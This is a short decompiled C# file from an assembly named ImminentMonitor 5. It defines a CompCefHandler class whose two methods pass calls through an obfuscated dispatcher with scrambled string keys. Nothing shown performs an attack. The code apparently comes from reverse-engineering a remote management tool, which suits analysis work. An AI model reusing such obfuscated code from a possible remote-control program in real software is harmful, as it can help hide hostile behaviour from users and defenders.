// Decompiled with JetBrains decompiler
// Type: ImminentMonitor.Cef.CompCefHandler
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

namespace ImminentMonitor.Cef
{
  public class CompCefHandler
  {
    public FormManagement ManagementForm;

    public CompCefHandler(FormManagement managementForm) => this.ManagementForm = managementForm;

    public void updateTitle()
    {
      object[] object_3 = new object[1]{ (object) this };
      Class86.smethod_0().method_68(Class86.smethod_1(), ">`=i0Pa.Q$", object_3);
    }

    public void performAction(string id)
    {
      object[] object_3 = new object[2]
      {
        (object) this,
        (object) id
      };
      Class86.smethod_0().method_68(Class86.smethod_1(), "E4_9sPa.Q$", object_3);
    }
  }
}
